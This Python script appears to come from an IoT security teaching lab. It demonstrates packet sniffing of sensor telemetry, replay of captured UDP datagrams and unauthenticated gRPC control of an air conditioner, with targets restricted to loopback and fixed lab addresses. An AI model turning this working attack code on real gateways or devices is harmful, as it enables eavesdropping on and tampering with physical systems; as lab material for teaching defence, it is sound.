#!/usr/bin/env python3
"""Local-only teaching demonstrations; never accepts remote targets or interfaces."""

import argparse
import fcntl
import json
import socket
import struct
import time
from pathlib import Path
from urllib.error import URLError
from urllib.request import urlopen

import datamesh_pb2
import datamesh_pb2_grpc
import grpc

LAB_IP = "127.0.0.1"
UDP_PORT = 9998
AC_PORT = 50051


def capture(timeout: int, interface: str, gateway_ip: str):
    """Observe UDP traffic sent to the local Gateway on Linux loopback."""
    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3)) as sniffer:
        sniffer.bind((interface, 0))
        sniffer.settimeout(1)
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                frame = sniffer.recv(65535)
            except TimeoutError:
                continue
            if len(frame) < 42 or frame[12:14] != b"\x08\x00":
                continue
            ip = frame[14:]
            ip_len = (ip[0] & 15) * 4
            if len(ip) < ip_len + 8 or ip[9] != 17:
                continue
            if socket.inet_ntoa(ip[16:20]) != gateway_ip:
                continue
            _, destination, length, _ = struct.unpack("!HHHH", ip[ip_len : ip_len + 8])
            if destination == UDP_PORT and length >= 8:
                yield ip[ip_len + 8 : ip_len + length]


def telemetry(payload: bytes):
    """Inspect public envelope metadata or parse insecure telemetry."""
    if payload.startswith(b"DMS2"):
        if len(payload) < 86 or payload[4] != 3:
            return None
        name_length = payload[5]
        try:
            sender = payload[26 : 26 + name_length].decode("utf-8")
        except UnicodeDecodeError:
            return None
        if not sender.startswith("temp-"):
            return None
        return sender, None, None, None
    packet = datamesh_pb2.TelemetryPacket()
    try:
        packet.ParseFromString(payload)
    except Exception:
        return None
    if not packet.device_id or not packet.HasField("temperature"):
        return None
    return packet.device_id, packet.timestamp_ms, packet.temperature.temperature_c, packet.is_alert


def sniff(timeout: int, interface: str, gateway_ip: str):
    print("[1] Listening on the lab interface for packets addressed to the Gateway.", flush=True)
    for payload in capture(timeout, interface, gateway_ip):
        reading = telemetry(payload)
        if reading:
            sender, _, temperature, alert = reading
            if temperature is None:
                print(
                    f"[2] Captured encrypted UDP from {sender}: {payload[-48:-32].hex()}...",
                    flush=True,
                )
                print("[3] Payload is encrypted; temperature and alert cannot be read.", flush=True)
            else:
                print(
                    f"[2] Captured plain Protobuf: {sender} {temperature:.1f} °C alert={alert}",
                    flush=True,
                )
            return
    print("[2] No temperature packet observed; check that the local lab is running.")


def replay(timeout: int, interface: str, gateway_ip: str, web_ip: str):
    print("[1] Capturing a temperature sensor datagram from Gateway traffic.", flush=True)
    for payload in capture(timeout, interface, gateway_ip):
        reading = telemetry(payload)
        if not reading:
            continue
        sender_id, timestamp, temperature, alert = reading
        if temperature is not None and (alert or temperature >= 35):
            continue
        if temperature is None:
            print(
                f"[2] Captured encrypted datagram from {sender_id}; its reading is unknown.",
                flush=True,
            )
        else:
            print(f"[2] Captured {sender_id}: {temperature:.1f} °C.", flush=True)
        print("[3] Trigger that sensor's anomaly now; replay starts in 3 seconds.", flush=True)
        time.sleep(3)
        transmit_replay(payload, gateway_ip, interval=0.5)
        print("[4] Sent 10 copies. UDP has no response; inspect Gateway security logs.", flush=True)
        try:
            with urlopen(
                f"http://{web_ip}:8080/api/telemetry/history?limit=100", timeout=3
            ) as response:
                history = json.load(response)
            readings = [row for row in history if row.get("device_id") == sender_id]
            if readings:
                latest = max(readings, key=lambda row: row["timestamp_ms"])
                print(
                    f"[5] Dashboard latest observed reading: {latest['temperature_c']:.1f} °C "
                    f"alert={latest['is_alert']}",
                    flush=True,
                )
                if timestamp is not None:
                    copies = sum(row["timestamp_ms"] == timestamp for row in readings)
                    print(
                        f"[6] Dashboard history contains {copies} record(s) with the captured "
                        "timestamp among its 100 most recent records.",
                        flush=True,
                    )
                else:
                    print(
                        "[6] The captured telemetry timestamp is encrypted; "
                        "inspect Gateway logs for rejection.",
                        flush=True,
                    )
            else:
                print("[5] Dashboard returned no readings for the captured sensor.")
        except (OSError, URLError, ValueError) as err:
            print(f"[5] Could not read dashboard state: {err}")
        return
    print("[2] No temperature packet observed; no replay was sent.")


def transmit_replay(payload: bytes, gateway_ip: str, interval: float = 0.3) -> None:
    """Replay one captured datagram at a fixed lab Gateway."""
    if gateway_ip not in {LAB_IP, "172.30.53.10"}:
        raise ValueError("target outside demo lab")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sender:
        for _ in range(10):
            sender.sendto(payload, (gateway_ip, UDP_PORT))
            time.sleep(interval)


def hijack_attempts(ac_ip: str, ca_path: Path):
    """Yield actual results of the two unauthenticated control attempts."""
    if ac_ip not in {LAB_IP, "172.30.53.11"}:
        raise ValueError("target outside demo lab")
    target = f"{ac_ip}:{AC_PORT}"
    ca = ca_path.read_bytes() if ca_path.is_file() else None
    request = datamesh_pb2.ACControlRequest(device_id="ac-01-carnot", power_on=False)
    for label, channel in (
        ("plaintext", grpc.insecure_channel(target)),
        (
            "TLS without client certificate",
            grpc.secure_channel(
                target,
                grpc.ssl_channel_credentials(root_certificates=ca),
                options=(("grpc.ssl_target_name_override", "ac"),),
            ),
        ),
    ):
        try:
            with channel:
                response = datamesh_pb2_grpc.AirConditionerServiceStub(channel).SetControl(
                    request, timeout=3
                )
                yield f"{label}: success={response.success}, {response.message}", response.success
                if response.success:
                    return
        except grpc.RpcError as err:
            yield f"{label}: {err}", False


def hijack(ac_ip: str, ca_path: Path):
    print(f"[1] Attempting unauthenticated AC control at {ac_ip}:{AC_PORT}.", flush=True)
    for message, _ in hijack_attempts(ac_ip, ca_path):
        print(f"[2] {message}")
    print("[3] Check the AC and Gateway logs for the actual system response.")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("scenario", choices=("sniff", "replay", "hijack"))
    parser.add_argument("--timeout", type=int, default=30)
    parser.add_argument("--lab", choices=("local", "compose"), default="local")
    args = parser.parse_args()
    if args.lab == "compose":
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
            address = fcntl.ioctl(probe.fileno(), 0x8915, struct.pack("256s", b"eth0"))
        if socket.inet_ntoa(address[20:24]) != "172.30.53.10":
            parser.error("compose attacks must run in the Gateway lab network namespace")
        interface, gateway_ip, ac_ip, ca_path = (
            "eth0",
            "172.30.53.10",
            "172.30.53.11",
            Path("/public/ca.crt"),
        )
    else:
        interface, gateway_ip, ac_ip = "lo", LAB_IP, LAB_IP
        ca_path = Path(".datamesh-security/ca.crt")
    web_ip = "172.30.53.13" if args.lab == "compose" else LAB_IP
    try:
        if args.scenario == "hijack":
            hijack(ac_ip, ca_path)
        elif args.scenario == "sniff":
            sniff(args.timeout, interface, gateway_ip)
        else:
            replay(args.timeout, interface, gateway_ip, web_ip)
    except PermissionError:
        parser.exit(1, "Packet capture requires CAP_NET_RAW; use the lab attacker container.\n")


if __name__ == "__main__":
    main()
